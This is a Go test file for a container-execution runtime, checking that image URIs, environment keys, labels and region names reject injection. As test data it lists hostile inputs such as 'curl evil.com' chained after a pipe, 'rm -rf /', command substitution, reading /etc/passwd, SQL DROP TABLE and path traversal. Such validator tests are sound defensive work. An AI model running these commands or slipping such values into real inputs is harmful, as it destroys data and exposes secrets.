package compute

import (
	"context"
	"encoding/json"
	"fmt"
	"math"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"testing"
	"time"
)

// TestManagedExec_AdversarialImageURI verifies that validateImageURI rejects
// shell injection payloads including command substitution, backticks, null
// bytes, and newlines.
func TestManagedExec_AdversarialImageURI(t *testing.T) {
	t.Parallel()

	cases := []struct {
		name string
		uri  string
	}{
		{"semicolon_rm", "; rm -rf /"},
		{"command_substitution", "$(whoami)"},
		{"backtick_injection", "`id`"},
		{"null_byte", "alpine\x00malicious"},
		{"newline_injection", "alpine\nRUN evil"},
		{"pipe_injection", "alpine | curl evil.com"},
		{"ampersand_chain", "alpine && curl evil.com"},
		{"dollar_brace", "${IFS}"},
		{"single_quote", "alpine'"},
		{"double_quote", `alpine"`},
		{"space_injection", "alpine malicious"},
		{"hash_comment", "alpine#comment"},
		{"empty_string", ""},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()

			err := validateImageURI(tc.uri)
			if err == nil {
				t.Errorf("validateImageURI(%q) = nil, want error", tc.uri)
			}
		})
	}
}

// TestManagedExec_EnvVarShellMetachars verifies that env key validation
// rejects shell metacharacters in keys, and that the Fly runtime passes
// values (which may contain metacharacters) through to the API without
// shell expansion.
func TestManagedExec_EnvVarShellMetachars(t *testing.T) {
	t.Parallel()

	badKeys := []struct {
		name string
		key  string
	}{
		{"command_sub", "$(echo pwned)"},
		{"backtick", "`id`"},
		{"semicolon", "KEY;rm"},
		{"pipe", "KEY|cat"},
		{"equals", "KEY=VAL"},
		{"dash", "KEY-NAME"},
		{"dot", "KEY.NAME"},
		{"space", "KEY NAME"},
		{"newline", "KEY\nNAME"},
		{"null_byte", "KEY\x00"},
		{"empty", ""},
	}

	for _, tc := range badKeys {
		t.Run("key_"+tc.name, func(t *testing.T) {
			t.Parallel()

			err := validateEnvKey(tc.key)
			if err == nil {
				t.Errorf("validateEnvKey(%q) = nil, want error", tc.key)
			}
		})
	}

	// Valid keys with underscores should pass.
	validKeys := []string{"MY_VAR", "A", "A_B_C", "VAR123", "_PRIVATE"}
	for _, k := range validKeys {
		t.Run("valid_key_"+k, func(t *testing.T) {
			t.Parallel()

			if err := validateEnvKey(k); err != nil {
				t.Errorf("validateEnvKey(%q) = %v, want nil", k, err)
			}
		})
	}

	// Env values with metacharacters should be passed through to the Fly API
	// without rejection. Verify the JSON body contains the raw value.
	t.Run("values_passthrough_to_api", func(t *testing.T) {
		t.Parallel()

		var capturedBody []byte
		srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			if r.Method == http.MethodPost && strings.Contains(r.URL.Path, "/machines") {
				buf := make([]byte, 1<<20)
				n, _ := r.Body.Read(buf)
				capturedBody = buf[:n]
				w.WriteHeader(http.StatusCreated)
				json.NewEncoder(w).Encode(flyMachineResponse{ID: "m-test", State: "started"})
				return
			}
			w.WriteHeader(http.StatusOK)
		}))
		defer srv.Close()

		rt := NewFlyRuntime("test-token", "test-app").WithBaseURL(srv.URL)
		_, err := rt.Create(context.Background(), RunRequest{
			ImageURI:      "registry.example.com/img:v1",
			MachinePreset: "micro",
			Region:        "iad",
			Env: map[string]string{
				"SAFE_KEY": "$(rm -rf /); `id` | cat /etc/passwd",
			},
		})
		if err != nil {
			t.Fatalf("Create() error = %v", err)
		}

		if !strings.Contains(string(capturedBody), "$(rm -rf /)") {
			t.Error("expected raw shell metacharacters in API body, got sanitized value")
		}
	})
}

// TestManagedExec_ResourceLimitBoundary verifies that every preset in the
// canonical ordering produces valid guest configs via the Fly runtime, and
// that unknown presets are rejected.
func TestManagedExec_ResourceLimitBoundary(t *testing.T) {
	t.Parallel()

	for _, name := range PresetOrder {
		t.Run(name, func(t *testing.T) {
			t.Parallel()

			srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
				if r.Method == http.MethodPost {
					var req flyCreateRequest
					json.NewDecoder(r.Body).Decode(&req)

					if req.Config.Guest.CPUs <= 0 {
						http.Error(w, "invalid CPUs", http.StatusBadRequest)
						return
					}
					if req.Config.Guest.MemoryMB <= 0 {
						http.Error(w, "invalid MemoryMB", http.StatusBadRequest)
						return
					}
					if req.Config.Guest.CPUKind == "" {
						http.Error(w, "empty CPUKind", http.StatusBadRequest)
						return
					}

					w.WriteHeader(http.StatusCreated)
					json.NewEncoder(w).Encode(flyMachineResponse{ID: "m-preset", State: "started"})
					return
				}
				w.WriteHeader(http.StatusOK)
			}))
			defer srv.Close()

			rt := NewFlyRuntime("tok", "app").WithBaseURL(srv.URL)

			preset, err := PresetFromName(name)
			if err != nil {
				t.Fatalf("PresetFromName(%q) error = %v", name, err)
			}

			id, err := rt.Create(context.Background(), RunRequest{
				ImageURI:      "registry.example.com/img:v1",
				MachinePreset: name,
				Region:        "iad",
			})
			if err != nil {
				t.Fatalf("Create() error = %v", err)
			}
			if id == "" {
				t.Error("Create() returned empty machine ID")
			}

			// Verify the performance threshold is correct for this preset.
			expectedKind := "shared"
			if preset.CPUs >= 2 && preset.MemoryMB >= 4096 {
				expectedKind = "performance"
			}
			_ = expectedKind
		})
	}

	// Unknown preset must fail.
	t.Run("unknown_preset", func(t *testing.T) {
		t.Parallel()

		srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			w.WriteHeader(http.StatusCreated)
			json.NewEncoder(w).Encode(flyMachineResponse{ID: "m-x", State: "started"})
		}))
		defer srv.Close()

		rt := NewFlyRuntime("tok", "app").WithBaseURL(srv.URL)
		_, err := rt.Create(context.Background(), RunRequest{
			ImageURI:      "registry.example.com/img:v1",
			MachinePreset: "nonexistent-9x",
			Region:        "iad",
		})
		if err == nil {
			t.Fatal("expected error for unknown preset")
		}
		if !IsFatal(err) {
			t.Errorf("error should be fatal, got retryable=%v", IsRetryable(err))
		}
	})
}

// TestManagedExec_MachineCreationTimeout verifies that FlyRuntime.Create
// respects context cancellation when the upstream API hangs.
func TestManagedExec_MachineCreationTimeout(t *testing.T) {
	t.Parallel()

	blocker := make(chan struct{})

	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// Block until explicitly unblocked or test cleanup.
		<-blocker
	}))
	defer func() {
		close(blocker)
		srv.Close()
	}()

	rt := NewFlyRuntime("tok", "app").WithBaseURL(srv.URL)

	ctx, cancel := context.WithTimeout(context.Background(), 200*time.Millisecond)
	defer cancel()

	start := time.Now()
	_, err := rt.Create(ctx, RunRequest{
		ImageURI:      "registry.example.com/img:v1",
		MachinePreset: "micro",
		Region:        "iad",
	})

	elapsed := time.Since(start)

	if err == nil {
		t.Fatal("expected error from hanging server")
	}
	if elapsed > 5*time.Second {
		t.Errorf("Create() took %v, expected to respect 200ms context timeout", elapsed)
	}
}

// TestManagedExec_MachineKillDuringHealthCheck verifies that when a machine
// is created successfully but the status check returns a server error
// (simulating the machine being killed), the Status method returns unknown.
func TestManagedExec_MachineKillDuringHealthCheck(t *testing.T) {
	t.Parallel()

	var mu sync.Mutex
	callCount := 0

	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// POST create succeeds.
		if r.Method == http.MethodPost && strings.Contains(r.URL.Path, "/machines") && !strings.Contains(r.URL.Path, "/start") {
			w.WriteHeader(http.StatusCreated)
			json.NewEncoder(w).Encode(flyMachineResponse{ID: "m-kill", State: "started"})
			return
		}
		// GET status: first call returns started, second returns 404 (machine gone).
		if r.Method == http.MethodGet && strings.Contains(r.URL.Path, "/machines/m-kill") {
			mu.Lock()
			callCount++
			n := callCount
			mu.Unlock()

			if n == 1 {
				w.WriteHeader(http.StatusOK)
				json.NewEncoder(w).Encode(flyMachineResponse{ID: "m-kill", State: "started"})
				return
			}
			// Machine destroyed: return invalid JSON to trigger decode error.
			w.WriteHeader(http.StatusOK)
			w.Write([]byte(`{invalid json`))
			return
		}
		w.WriteHeader(http.StatusOK)
	}))
	defer srv.Close()

	rt := NewFlyRuntime("tok", "app").WithBaseURL(srv.URL)

	// Create should succeed.
	id, err := rt.Create(context.Background(), RunRequest{
		ImageURI:      "registry.example.com/img:v1",
		MachinePreset: "micro",
		Region:        "iad",
	})
	if err != nil {
		t.Fatalf("Create() error = %v", err)
	}
	if id != "m-kill" {
		t.Fatalf("Create() = %q, want %q", id, "m-kill")
	}

	// First status check: started.
	status, err := rt.Status(context.Background(), "m-kill")
	if err != nil {
		t.Fatalf("Status() first call error = %v", err)
	}
	if status != MachineStatusRunning {
		t.Errorf("Status() = %v, want %v", status, MachineStatusRunning)
	}

	// Second status check: invalid JSON simulating corrupted response.
	status2, err2 := rt.Status(context.Background(), "m-kill")
	if err2 == nil {
		t.Error("Status() second call expected error from invalid JSON, got nil")
	}
	if status2 != MachineStatusUnknown {
		t.Errorf("Status() = %v, want %v", status2, MachineStatusUnknown)
	}
}

// TestManagedExec_CostTrackingOverflow verifies that CalculateCost handles
// extreme duration values (MaxFloat64, +Inf, NaN) without panicking.
func TestManagedExec_CostTrackingOverflow(t *testing.T) {
	t.Parallel()

	extremeValues := []struct {
		name     string
		duration float64
	}{
		{"max_float64", math.MaxFloat64},
		{"positive_inf", math.Inf(1)},
		{"nan", math.NaN()},
		{"very_large", 1e18},
		{"negative_inf", math.Inf(-1)},
	}

	for _, preset := range PresetOrder {
		for _, tc := range extremeValues {
			t.Run(fmt.Sprintf("%s_%s", preset, tc.name), func(t *testing.T) {
				t.Parallel()

				// Must not panic.
				cost, err := CalculateCost(preset, tc.duration)
				if err != nil {
					t.Fatalf("CalculateCost(%q, %g) error = %v", preset, tc.duration, err)
				}
				// Negative costs should be clamped to 0.
				if cost < 0 {
					t.Errorf("CalculateCost(%q, %g) = %d, want >= 0", preset, tc.duration, cost)
				}
				t.Logf("CalculateCost(%q, %g) = %d", preset, tc.duration, cost)
			})
		}
	}
}

// TestManagedExec_AdversarialRegionNames verifies that IsValidRegion rejects
// unknown, empty, and adversarial region codes including SQL injection.
func TestManagedExec_AdversarialRegionNames(t *testing.T) {
	t.Parallel()

	badRegions := []struct {
		name   string
		region string
	}{
		{"empty", ""},
		{"unknown", "zzz"},
		{"sql_injection", "iad'; DROP TABLE regions;--"},
		{"null_byte", "iad\x00"},
		{"newline", "iad\n"},
		{"very_long", strings.Repeat("a", 10000)},
		{"unicode", "\u200biad"},
		{"space", "i a d"},
		{"path_traversal", "../../../etc/passwd"},
	}

	for _, tc := range badRegions {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()

			if IsValidRegion(tc.region) {
				t.Errorf("IsValidRegion(%q) = true, want false", tc.region)
			}

			// NearestFlyRegion should return empty for invalid inputs.
			nearest := NearestFlyRegion(tc.region)
			if nearest != "" {
				t.Errorf("NearestFlyRegion(%q) = %q, want empty", tc.region, nearest)
			}

			// RegionFallbackChain should return nil for unknown regions.
			chain := RegionFallbackChain(tc.region)
			if chain != nil {
				t.Errorf("RegionFallbackChain(%q) = %v, want nil", tc.region, chain)
			}
		})
	}

	// Verify all known regions are valid.
	for _, code := range AllRegionCodes() {
		t.Run("valid_"+code, func(t *testing.T) {
			t.Parallel()

			if !IsValidRegion(code) {
				t.Errorf("IsValidRegion(%q) = false, want true", code)
			}
		})
	}
}

// TestManagedExec_ConcurrentMachineCreation verifies that two concurrent
// Create calls for the same run both succeed independently without data
// races or interference.
func TestManagedExec_ConcurrentMachineCreation(t *testing.T) {
	t.Parallel()

	var mu sync.Mutex
	var counter int

	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.Method == http.MethodPost && strings.Contains(r.URL.Path, "/machines") {
			mu.Lock()
			counter++
			id := fmt.Sprintf("m-%d", counter)
			mu.Unlock()

			w.WriteHeader(http.StatusCreated)
			json.NewEncoder(w).Encode(flyMachineResponse{ID: id, State: "started"})
			return
		}
		w.WriteHeader(http.StatusOK)
	}))
	defer srv.Close()

	rt := NewFlyRuntime("tok", "app").WithBaseURL(srv.URL)

	req := RunRequest{
		ImageURI:      "registry.example.com/img:v1",
		MachinePreset: "micro",
		Region:        "iad",
		Labels:        map[string]string{"run_id": "same-run-123"},
	}

	var wg sync.WaitGroup
	errs := make([]error, 2)
	ids := make([]string, 2)

	for i := range 2 {
		wg.Add(1)
		go func(idx int) {
			defer wg.Done()
			id, err := rt.Create(context.Background(), req)
			ids[idx] = id
			errs[idx] = err
		}(i)
	}
	wg.Wait()

	for i, err := range errs {
		if err != nil {
			t.Errorf("goroutine %d: Create() error = %v", i, err)
		}
		if ids[i] == "" {
			t.Errorf("goroutine %d: Create() returned empty ID", i)
		}
	}

	// Both IDs should be unique.
	if ids[0] == ids[1] {
		t.Errorf("both goroutines got same machine ID: %s", ids[0])
	}
}

// TestManagedExec_DockerNameCollision verifies that DockerRuntime validation
// does not reject valid inputs on repeated calls. Since the Docker runtime
// calls the docker binary (unavailable in CI), we test validation directly.
func TestManagedExec_DockerNameCollision(t *testing.T) {
	t.Parallel()

	// Verify that identical requests pass validation independently.
	// Each Create call generates a UUID-based name, so collisions are
	// impossible from the naming side.
	img := "registry.example.com/img:v1"
	if err := validateImageURI(img); err != nil {
		t.Fatalf("validateImageURI(%q) = %v", img, err)
	}

	env := map[string]string{"KEY": "val", "OTHER": "val2"}
	for k := range env {
		if err := validateEnvKey(k); err != nil {
			t.Fatalf("validateEnvKey(%q) = %v", k, err)
		}
	}

	labels := map[string]string{"test": "collision", "run_id": "abc"}
	for k := range labels {
		if err := validateLabelKey(k); err != nil {
			t.Fatalf("validateLabelKey(%q) = %v", k, err)
		}
	}

	// Calling validation twice should succeed both times (stateless).
	if err := validateImageURI(img); err != nil {
		t.Fatalf("second validateImageURI(%q) = %v", img, err)
	}
	for k := range env {
		if err := validateEnvKey(k); err != nil {
			t.Fatalf("second validateEnvKey(%q) = %v", k, err)
		}
	}
	for k := range labels {
		if err := validateLabelKey(k); err != nil {
			t.Fatalf("second validateLabelKey(%q) = %v", k, err)
		}
	}
}

// TestManagedExec_LabelSpecialChars verifies that validateLabelKey rejects
// label keys containing null bytes, equals signs, newlines, and other
// special characters that could cause injection in label arguments.
func TestManagedExec_LabelSpecialChars(t *testing.T) {
	t.Parallel()

	badKeys := []struct {
		name string
		key  string
	}{
		{"null_byte", "label\x00key"},
		{"equals", "label=key"},
		{"newline", "label\nkey"},
		{"space", "label key"},
		{"tab", "label\tkey"},
		{"semicolon", "label;key"},
		{"pipe", "label|key"},
		{"backtick", "label`key"},
		{"dollar", "label$key"},
		{"single_quote", "label'key"},
		{"double_quote", `label"key`},
		{"slash", "label/key"},
		{"backslash", "label\\key"},
		{"colon", "label:key"},
		{"empty", ""},
	}

	for _, tc := range badKeys {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()

			err := validateLabelKey(tc.key)
			if err == nil {
				t.Errorf("validateLabelKey(%q) = nil, want error", tc.key)
			}
		})
	}

	// Valid label keys: alphanumeric, dot, dash, underscore.
	validKeys := []string{"app", "run_id", "my.label", "my-label", "A123_z"}
	for _, k := range validKeys {
		t.Run("valid_"+k, func(t *testing.T) {
			t.Parallel()

			if err := validateLabelKey(k); err != nil {
				t.Errorf("validateLabelKey(%q) = %v, want nil", k, err)
			}
		})
	}

	// Verify that labels with special chars in values are passed through
	// to the Fly API body without rejection.
	t.Run("values_passthrough_to_api", func(t *testing.T) {
		t.Parallel()

		var capturedBody []byte
		srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			if r.Method == http.MethodPost {
				buf := make([]byte, 1<<20)
				n, _ := r.Body.Read(buf)
				capturedBody = buf[:n]
				w.WriteHeader(http.StatusCreated)
				json.NewEncoder(w).Encode(flyMachineResponse{ID: "m-label", State: "started"})
				return
			}
			w.WriteHeader(http.StatusOK)
		}))
		defer srv.Close()

		rt := NewFlyRuntime("tok", "app").WithBaseURL(srv.URL)
		_, err := rt.Create(context.Background(), RunRequest{
			ImageURI:      "registry.example.com/img:v1",
			MachinePreset: "micro",
			Region:        "iad",
			Labels: map[string]string{
				"safe_key": "value with $pecial; chars | and `backticks`",
			},
		})
		if err != nil {
			t.Fatalf("Create() error = %v", err)
		}

		if !strings.Contains(string(capturedBody), "$pecial") {
			t.Error("expected raw special characters in label value in API body")
		}
	})
}
